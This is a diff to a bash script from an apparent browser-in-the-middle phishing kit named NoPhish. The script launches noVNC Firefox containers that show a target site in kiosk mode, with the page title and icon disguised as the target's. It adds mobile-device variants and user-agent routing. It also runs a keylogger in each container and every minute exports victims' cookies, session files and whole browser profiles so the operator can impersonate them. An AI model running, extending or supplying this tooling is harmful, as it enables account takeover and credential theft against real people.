@@ -47,6 +47,7 @@ case "$1" in
 
 "install")
 	sudo docker build -t vnc-docker -f ./VNC-Dockerfile ./
+	sudo docker build -t mvnc-docker -f ./MVNC-Dockerfile ./
 	sudo docker build -t rev-proxy -f ./PROXY-Dockerfile ./
 	;;
 "cleanup")
@@ -57,6 +58,7 @@ case "$1" in
 	    case $yn in
 	    [Yy]* ) 
 			sudo docker rmi -f $(sudo docker images --filter=reference="vnc-docker" -q)
+			sudo docker rmi -f $(sudo docker images --filter=reference="mvnc-docker" -q)
 			sudo docker rmi -f $(sudo docker images --filter=reference="rev-proxy" -q)
 			exit;;
 	    [Nn]* ) exit;;
@@ -92,7 +94,7 @@ case "$1" in
 	fi
 
 	START=1
-	END=$User
+	END=$((User * 2))
 	
 	temptitle=$(curl $Target -sL -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' | grep -oP '(?<=title).*(?<=title>)' | grep -oP '(?=>).*(?=<)') 
 	pagetitle="${temptitle:1}"
@@ -138,6 +140,7 @@ case "$1" in
 		<Location /status.php>
 		    Deny from all
 		</Location>
+
 		' >> ./proxy/000-default.conf
 	fi
 	 
@@ -324,7 +327,7 @@ case "$1" in
         
         
         
-        
+        mobile=false
 	declare -a urls=()
 	printf "[-] Starting containers \033[0K\r\n"  
 	for (( c=$START; c<=$END; c++ ))
@@ -332,44 +335,91 @@ case "$1" in
 	    PW=$(openssl rand -hex 14)
 	    AdminPW=$(tr -dc 'A-Za-z0-9!' < /dev/urandom | head -c 32)
 	    Token=$(cat /proc/sys/kernel/random/uuid)
-	    sudo docker run -dit --name vnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 vnc-docker  &> /dev/null 
-	    sleep 1
-	    sudo docker exec vnc-user$c sh -c "firefox &" &> /dev/null
-	    sleep 1
-	    sudo docker exec vnc-user$c sh -c "pidof firefox | xargs kill &" &> /dev/null
+	    if [ "$mobile" = "true" ]
+	    then
+	    	sudo docker run -dit --name mvnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 mvnc-docker  &> /dev/null 
+	    	sleep 1
+	    	sudo docker exec mvnc-user$c sh -c "firefox &" &> /dev/null
+	    	sleep 1
+	    	sudo docker exec mvnc-user$c sh -c "pidof firefox | xargs kill &" &> /dev/null
+	    else
+	    	sudo docker run -dit --name vnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 vnc-docker  &> /dev/null 
+	    	sleep 1
+	    	sudo docker exec vnc-user$c sh -c "firefox &" &> /dev/null
+	    	sleep 1
+	    	sudo docker exec vnc-user$c sh -c "pidof firefox | xargs kill &" &> /dev/null
+	    fi
+	    	
 	    if [ -n "$useragent" ]
 	    then
-	    	echo 'user_pref("general.useragent.override","'$useragent'");' > ./vnc/user.js
-	    	echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/user.js
-	    	echo 'user_pref("signon.showAutoCompleteFooter", false);' >> ./vnc/user.js
-	    	echo 'user_pref("signon.rememberSignons", false);' >> ./vnc/user.js
-	    	echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/user.js
-	    	echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/user.js
-	    	sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/
-	    	sudo docker exec vnc-user$c /bin/bash -c 'find -name prefs.js -exec dirname {} \; | xargs cp /home/headless/user.js '
+	    	if [ "$mobile" = "true" ]
+	    	then
+		    	echo 'user_pref("general.useragent.override","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.1 Mobile/15E148 Safari/605.1.15");' > ./vnc/muser.js
+		    	echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/muser.js
+		    	echo 'user_pref("signon.showAutoCompleteFooter", false);' >> ./vnc/muser.js
+		    	echo 'user_pref("signon.rememberSignons", false);' >> ./vnc/muser.js
+		    	echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/muser.js
+		    	echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/muser.js
+		    	sudo docker cp ./vnc/muser.js mvnc-user$c:/home/headless/user.js
+		    	sudo docker exec mvnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -n 1 cp -f -r /home/headless/user.js "
+		else
+		    	echo 'user_pref("general.useragent.override","'$useragent'");' > ./vnc/user.js
+		    	echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/user.js
+		    	echo 'user_pref("signon.showAutoCompleteFooter", false);' >> ./vnc/user.js
+		    	echo 'user_pref("signon.rememberSignons", false);' >> ./vnc/user.js
+		    	echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/user.js
+		    	echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/user.js
+		    	sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/user.js
+		    	sudo docker exec vnc-user$c /bin/bash -c 'find -name prefs.js -exec dirname {} \; | xargs cp /home/headless/user.js '
+ 		fi
+
 	    else
-	    	echo 'user_pref("general.useragent.override","This user was phished by NoPhish");' > ./vnc/user.js
-	    	echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/user.js
-	    	echo 'user_pref("signon.showAutoCompleteFooter", false);' >> ./vnc/user.js
-	    	echo 'user_pref("signon.rememberSignons", false);' >> ./vnc/user.js
-	    	echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/user.js
-	    	echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/user.js
-	    	sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/user.js
-	    	sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -n 1 cp -f -r /home/headless/user.js "	    	  
+	    	if [ "$mobile" = "true" ]
+	    	then
+		    	echo 'user_pref("general.useragent.override","Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/114.1 Mobile/15E148 Safari/605.1.15");' > ./vnc/muser.js
+		    	echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/muser.js
+		    	echo 'user_pref("signon.showAutoCompleteFooter", false);' >> ./vnc/muser.js
+		    	echo 'user_pref("signon.rememberSignons", false);' >> ./vnc/muser.js
+		    	echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/muser.js
+		    	echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/muser.js
+		    	echo 'user_pref("layout.css.devPixelsPerPx", "0.9");' >> ./vnc/muser.js
+		    	sudo docker cp ./vnc/muser.js mvnc-user$c:/home/headless/user.js
+		    	sudo docker exec mvnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -n 1 cp -f -r /home/headless/user.js "
+	    	else    	
+			echo 'user_pref("general.useragent.override","This user was phished by NoPhish");' > ./vnc/user.js
+		    	echo 'user_pref("font.name.serif.x-western", "DejaVu Sans");' >> ./vnc/user.js
+		    	echo 'user_pref("signon.showAutoCompleteFooter", false);' >> ./vnc/user.js
+		    	echo 'user_pref("signon.rememberSignons", false);' >> ./vnc/user.js
+		    	echo 'user_pref("signon.formlessCapture.enabled", false);' >> ./vnc/user.js
+		    	echo 'user_pref("signon.storeWhenAutocompleteOff", false);' >> ./vnc/user.js
+		    	sudo docker cp ./vnc/user.js vnc-user$c:/home/headless/user.js
+		    	sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec dirname {} \; | xargs -n 1 cp -f -r /home/headless/user.js "
+	    	fi	   	  
 	    fi
 	    
 	    sleep 1
 	    
 	    if [ -n "$pagetitle" ]
 	    then
-	        sudo docker exec --user root vnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/conn.html"
-	        sudo docker exec --user root vnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/app/ui.js"
+	        if [ "$mobile" = "true" ]
+	    	then
+	        	sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/conn.html"
+	        	sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/app/ui.js"
+	        	sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/min-width: 8em;/\/\*min-width: 8em;\*\//' /usr/libexec/noVNCdim/app/styles/input.css"
+	        else
+	        	sudo docker exec --user root vnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/conn.html"
+	        	sudo docker exec --user root vnc-user$c sh -c "sed -i 's/Connecting.../$pagetitle/' /usr/libexec/noVNCdim/app/ui.js"
+	        fi
 	    fi
 	    
 	    if [ -e $icopath ]
 	    then
-	    	sudo docker cp ./novnc.ico vnc-user$c:/usr/libexec/noVNCdim/app/images/icons/novnc.ico
-	    	
+	    	if [ "$mobile" = "true" ]
+	    	then
+	    		sudo docker cp ./novnc.ico mvnc-user$c:/usr/libexec/noVNCdim/app/images/icons/novnc.ico
+	    	else
+	    		sudo docker cp ./novnc.ico vnc-user$c:/usr/libexec/noVNCdim/app/images/icons/novnc.ico
+	    	fi
 	    fi
 
 
@@ -378,27 +428,72 @@ case "$1" in
 	    if [ -n "$Redirect" ]
 	    then
 	    	RedirectTarget=$Target
-	    	sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/${Target//\//\\/}/g' /usr/libexec/noVNCdim/app/ui.js"
+	    	if [ "$mobile" = "true" ]
+	    	then
+	    		sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/TARGET_URL/${Target//\//\\/}/g' /usr/libexec/noVNCdim/app/ui.js"
+	    	else
+	    		sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/${Target//\//\\/}/g' /usr/libexec/noVNCdim/app/ui.js"
+	    	fi
 	    else
 	    	RedirectTarget="/"
 	    	if [ -n "$SSL" ]
 	    	then
-	    		sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/https:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
+	    		if [ "$mobile" = "true" ]
+	    		then
+	    			sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/TARGET_URL/https:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
+	    		else
+	    			sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/https:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
+	    		fi
 	    	else
-	    		sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/http:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
+	    		if [ "$mobile" = "true" ]
+	    		then
+	    			sudo docker exec --user root mvnc-user$c sh -c "sed -i 's/TARGET_URL/http:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
+	    		else
+	    			sudo docker exec --user root vnc-user$c sh -c "sed -i 's/TARGET_URL/http:\/\/$Domain/g' /usr/libexec/noVNCdim/app/ui.js"
+	    		fi
 	    	fi
 	    fi
 	    
 	    # Keylogger
-	    sudo docker cp ./vnc/logger.py vnc-user$c:/home/headless/   
-	    sleep 1
-	    sudo docker exec -dit vnc-user$c sh -c "python3 /home/headless/logger.py"     
+	    
+	    if [ "$mobile" = "true" ]
+	    then
+	    	sudo docker cp ./vnc/logger.py mvnc-user$c:/home/headless/ 
+	    	sleep 1
+	    	sudo docker exec -dit mvnc-user$c sh -c "python3 /home/headless/logger.py" 
+	    else
+	    	sudo docker cp ./vnc/logger.py vnc-user$c:/home/headless/
+	    	sleep 1
+	    	sudo docker exec -dit vnc-user$c sh -c "python3 /home/headless/logger.py"   
+	    fi   
+
+	    
+	    if [ "$mobile" = "true" ]
+	    then
+		sudo docker exec mvnc-user$c sh -c "nohup unclutter -idle 0 > /dev/null 2>&1 &"
+		sudo docker exec mvnc-user$c sh -c "xrandr --output VNC-0 & env DISPLAY=:1 firefox $Target --kiosk &" &> /dev/null    
+	    else
+	    	sudo docker exec vnc-user$c sh -c "xfconf-query --channel xsettings --property /Gtk/CursorThemeName --set WinCursor &" 
+	    	sudo docker exec vnc-user$c sh -c "xrandr --output VNC-0 & env DISPLAY=:1 firefox $Target --kiosk &" &> /dev/null		    
+	    fi     
+
+	    if [ "$mobile" = "true" ]
+	    then
+            	CIP=$(sudo sudo docker container inspect mvnc-user$c | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
+	    else
+	    	CIP=$(sudo sudo docker container inspect vnc-user$c | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
+	    fi
+	    
+	    	    
+	    if [ "$mobile" = "true" ]
+	    then
+	    	filename="miframe$((c - 1)).html"
+	    else
+	    	filename="iframe$c.html"
+	    fi
 	    
 	    
-	    sudo docker exec vnc-user$c sh -c "xfconf-query --channel xsettings --property /Gtk/CursorThemeName --set WinCursor &" 
-	    sudo docker exec vnc-user$c sh -c "xrandr --output VNC-0 & env DISPLAY=:1 firefox $Target --kiosk &" &> /dev/null
 	    
-	    CIP=$(sudo sudo docker container inspect vnc-user$c | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
 	    if [ -n "$SSL" ]
 	    then
 		echo "
@@ -440,7 +535,7 @@ case "$1" in
 		    <iframe id='myIframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote' frameborder='0'></iframe>
 		</body>
 		</html>
-		" > ./proxy/iframe$c.html
+		" > ./proxy/$filename
 	    else
 		echo "
 		<!DOCTYPE html>
@@ -479,14 +574,24 @@ case "$1" in
 		    <iframe id='myIframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote' frameborder='0'></iframe>
 		</body>
 		</html>
-		" > ./proxy/iframe$c.html
+		" > ./proxy/$filename
 	    fi
+	    
+	    if [ "$mobile" = "false" ]
+	    then
 	    echo "
 	    	RewriteCond %{REQUEST_URI} /v$c
+	    	RewriteCond %{HTTP_USER_AGENT} \"iPhone|Android|iPad\"
+    		RewriteRule ^/(.*) /miframe$c.html [P,L]
+    		
+    		RewriteCond %{REQUEST_URI} /v$c
+    		RewriteCond %{HTTP_USER_AGENT} !(iPhone|Android|iPad)
     		RewriteRule ^/(.*) /iframe$c.html [P]
 	    " >> ./proxy/000-default.conf
+	    fi
 	    
 	    echo "
+	        
 		<Location /$PW>
 		ProxyPass http://$CIP:6901
 		ProxyPassReverse http://$CIP:6901
@@ -551,6 +656,14 @@ case "$1" in
 		urls+=("http://$Domain/v$c/oauth2/authorize?access-token=$Token")
 		fi
 	    fi
+	
+	if [ "$mobile" = "true" ]
+	then
+		mobile=false
+	else
+		mobile=true
+	fi 
+	
 	done
 	echo "
 	    </div>
@@ -599,9 +712,11 @@ case "$1" in
 	sudo docker exec -it rev-proxy /bin/bash -c "htpasswd -cb /etc/apache2/.htpasswd angler $AdminPW"
 	sudo docker cp ./proxy/000-default.conf rev-proxy:/etc/apache2/sites-enabled/   &> /dev/null
 	sudo docker cp ./novnc.ico rev-proxy:/var/www/html/favicon.ico
+	END=$((END / 2))
 	for (( d=$START; d<=$END; d++ ))
 	do
 		sudo docker cp ./proxy/iframe$d.html rev-proxy:/var/www/html/
+		sudo docker cp ./proxy/miframe$d.html rev-proxy:/var/www/html/
 	done
 	sudo docker exec rev-proxy sed -i 's/MaxKeepAliveRequests 100/MaxKeepAliveRequests 0/' '/etc/apache2/apache2.conf'
 	
@@ -642,6 +757,9 @@ case "$1" in
 	printf "    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..\n"
 	trap 'printf "\n[-] Import stealed session and cookie JSON or the firefox profile to impersonate user\n"; printf "[-] VNC and Rev-Proxy container will be removed\n" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT
 	sleep 60
+	
+
+	
 	while :
 	do
 	for (( c=$START; c<=$END; c++ ))
@@ -650,36 +768,60 @@ case "$1" in
            sudo docker exec vnc-user$c sh -c "find -name recovery.jsonlz4 -exec cp {} /home/headless/ \;"
            sudo docker exec vnc-user$c sh -c "find -name cookies.sqlite -exec cp {} /home/headless/ \;"
            sudo docker exec vnc-user$c test -e /home/headless/Keylog.txt && sudo docker cp vnc-user$c:/home/headless/Keylog.txt ./user$c-keylog.txt
+           sudo docker exec "mvnc-user$((c + 1 ))" sh -c "find -name recovery.jsonlz4 -exec cp {} /home/headless/ \;"
+           sudo docker exec "mvnc-user$((c + 1 ))" sh -c "find -name cookies.sqlite -exec cp {} /home/headless/ \;"
+           sudo docker exec "mvnc-user$((c + 1 ))" test -e /home/headless/Keylog.txt && sudo docker cp mvnc-user$c:/home/headless/Keylog.txt ./muser$c-keylog.txt
            sleep 2
            sudo docker cp vnc-user$c:/home/headless/recovery.jsonlz4 ./user$c-recovery.jsonlz4
            sudo docker cp vnc-user$c:/home/headless/cookies.sqlite ./user$c-cookies.sqlite
            sudo docker exec vnc-user$c sh -c "rm -f /home/headless/recovery.jsonlz4"
            sudo docker exec vnc-user$c sh -c "rm -f /home/headless/cookies.sqlite"
+           
+           sudo docker cp "mvnc-user$((c + 1 ))":/home/headless/recovery.jsonlz4 ./muser$c-recovery.jsonlz4
+           sudo docker cp "mvnc-user$((c + 1 ))":/home/headless/cookies.sqlite ./muser$c-cookies.sqlite
+           sudo docker exec "mvnc-user$((c + 1 ))" sh -c "rm -f /home/headless/recovery.jsonlz4"
+           sudo docker exec "mvnc-user$((c + 1 ))" sh -c "rm -f /home/headless/cookies.sqlite"
            sleep 2
            if [ -n "$OFormat" ]
 	   then
 		python3 ./session-collector.py ./user$c-recovery.jsonlz4 simple
 		python3 ./cookies-collector.py ./user$c-cookies.sqlite simple
+		python3 ./session-collector.py ./muser$c-recovery.jsonlz4 simple
+		python3 ./cookies-collector.py ./muser$c-cookies.sqlite simple
 	   else
 		sudo docker exec vnc-user$c sh -c 'cp -rf .mozilla/firefox/$(find -name recovery.jsonlz4 | cut -d "/" -f 4)/ ffprofile'
 		sudo docker cp vnc-user$c:/home/headless/ffprofile ./phis$c-ffprofile
 		sudo docker exec vnc-user$c sh -c "rm -rf /home/headless/ffprofile"
 		sudo chown -R 1000 ./phis$c-ffprofile
 		
+		sudo docker exec "mvnc-user$((c + 1 ))" sh -c 'cp -rf .mozilla/firefox/$(find -name recovery.jsonlz4 | cut -d "/" -f 4)/ ffprofile'
+		sudo docker cp "mvnc-user$((c + 1 ))":/home/headless/ffprofile ./mphis$c-ffprofile
+		sudo docker exec "mvnc-user$((c + 1 ))" sh -c "rm -rf /home/headless/ffprofile"
+		sudo chown -R 1000 ./mphis$c-ffprofile
+		
 		if [ "$rzip" = true ] 
 		then
 		   zip -r phis$c-ffprofile.zip phis$c-ffprofile/ &> /dev/null
 		   rm -r phis$c-ffprofile/
+		   
+		   zip -r mphis$c-ffprofile.zip mphis$c-ffprofile/ &> /dev/null
+		   rm -r mphis$c-ffprofile/
 		fi
 		python3 ./session-collector.py ./user$c-recovery.jsonlz4 default
 		python3 ./cookies-collector.py ./user$c-cookies.sqlite default
-	   
+	   	python3 ./session-collector.py ./muser$c-recovery.jsonlz4 default
+		python3 ./cookies-collector.py ./muser$c-cookies.sqlite default
 	   fi
 
 	   
            rm -r -f ./user$c-recovery.jsonlz4 
            rm -r -f ./user$c-cookies.sqlite
            rm -r -f ./user$c-cookies.sqlite*
+           
+           rm -r -f ./muser$c-recovery.jsonlz4 
+           rm -r -f ./muser$c-cookies.sqlite
+           rm -r -f ./muser$c-cookies.sqlite*
+           
            python3 ./status.py $c "${urls[$(($c - 1))]}"
 	   
 	   popd &> /dev/null
